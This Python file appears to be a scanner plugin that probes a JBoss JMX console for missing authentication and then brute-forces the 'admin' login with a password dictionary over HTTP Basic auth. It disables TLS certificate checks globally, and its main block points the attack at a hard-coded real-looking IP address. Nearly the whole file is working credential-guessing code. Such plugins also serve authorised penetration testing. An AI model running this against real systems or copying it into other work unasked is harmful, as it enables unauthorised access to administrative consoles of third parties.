__author__ = '10192989'
# -*- coding:utf-8 -*-

import re
from exp.lib.httpparse import httpparse
import base64
from exp.lib.gla import getpassdict
import urllib.request, urllib.error, urllib.parse
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if JBOSS-JMXConsole')
    htt = httpparse()
    passdictarr = getpassdict()
    error_i = 0
    psw = passdictarr.get_pass_dict()
    try:
        tm = htt.httpreq('GET', protocol, ip, port, '/jmx-console/')
        if re.search('jboss',str(tm[1]),re.I):
            if tm[0] == 200:
                msg = 'Found JBOSS-JMXConsole! in url:'+url+'JBOSS-JMXConsole with no password'
                print(msg)
                number = 'v6'
                return True,url,number,msg
            else:
                for pass_ in psw:
                    try:
                        login_url = url+'/jmx-console/'
                        request = urllib.request.Request(login_url)
                        auth_str_temp = 'admin' + ':' + pass_
                        auth_str = base64.b64encode(auth_str_temp.encode(encoding='utf-8'))
                        request.add_header('Authorization', 'Basic ' + auth_str.decode())
                        res = urllib.request.urlopen(request, timeout=5)
                        res_code = res.code
                    except urllib.error.HTTPError as e:
                        res_code = e.code
                    except urllib.error.URLError as e:
                        error_i += 1
                        if error_i >= 3:
                            msg = 'Therer is no JBOSS-JMXConsole weakpass vul in url:' +login_url+'.'
                            number = 'v0'
                            return False,url,number,msg
                        continue
                    if int(res_code) == 404 or int(res_code) == 502:
                        msg = 'Therer is no JBOSS-JMXConsole vul in url:' +login_url+'.'
                        number = 'v0'
                        return False,url,number,msg
                    if int(res_code) == 401 or int(res_code) == 403:
                        continue
                    if int(res_code) == 200:
                        msg = 'Found JBOSS-JMXConsole in url:'+url+'/jmx-console/HtmlAdaptor with password: '+pass_+'.'
                        print(msg)
                        number = 'v6'
                        return True,url,number,msg
                    else:
                        pass
        msg = 'Therer is no JBOSS-JMXConsole weakpass vul in url:' +login_url+'.'
        number = 'v0'
        return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no JBOSS-JMXConsole weakpass vul on url'
    number = 'v0'
    return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','223.202.25.77',80)
    print(res)
